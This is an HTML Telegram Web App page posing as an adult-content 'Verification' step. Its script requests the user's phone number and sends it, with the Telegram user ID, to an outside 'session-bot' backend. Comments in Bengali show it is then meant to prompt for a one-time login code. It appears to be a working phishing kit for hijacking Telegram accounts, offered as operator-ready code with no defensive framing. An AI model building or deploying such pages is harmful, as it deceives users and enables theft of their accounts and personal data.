<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: white; color: #333; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
        .hidden { display: none; }
        .loader { color: #28a745; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Verification Required</h2>
        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Please confirm your identity to access the premium files.</p>
        
        <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
        
        <div id="loader" class="hidden">
            <div class="loader">Connecting...</div>
            <p style="font-size: 12px;">Please wait while we secure your connection.</p>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        
        // আপনার Hugging Face App URL এখানে দিন (শেষে / থাকবে না)
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;

        function startFlow() {
            tg.requestContact();
            document.getElementById('main_btn').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") {
                    sendNumber(data.phone);
                } else {
                    setTimeout(poll, 1500);
                }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumber(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    // সফল হলে অ্যাপ ক্লোজ হয়ে যাবে এবং চ্যাটে ওটিপি বাটন যাবে
                    tg.close();
                } else {
                    alert("Error: " + data.message);
                    location.reload();
                }
            } catch (e) { alert("Server Error!"); }
        }
    </script>
</body>
</html>
